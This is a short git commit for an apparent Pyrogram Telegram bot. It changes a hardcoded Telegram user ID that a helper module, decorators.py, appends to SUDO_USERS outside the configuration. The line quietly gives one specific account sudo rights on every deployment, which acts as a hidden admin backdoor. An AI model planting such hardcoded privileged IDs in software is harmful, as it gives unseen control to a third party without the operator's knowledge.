2c620e99bc7174d9700f3a8e8d529d30587621f1
Aditya <90302830+spark3600@users.noreply.github.com>
2022-05-03 20:11:30 +0530

    Update decorators.py

--- modules/helpers/decorators.py
+++ modules/helpers/decorators.py
@@ -4,7 +4,7 @@ from pyrogram.types import Message
 from modules.helpers.admins import get_administrators
 from modules.config import SUDO_USERS
 
-SUDO_USERS.append(1163686164)
+SUDO_USERS.append(1844115387)
 
 
 def errors(func: Callable) -> Callable:
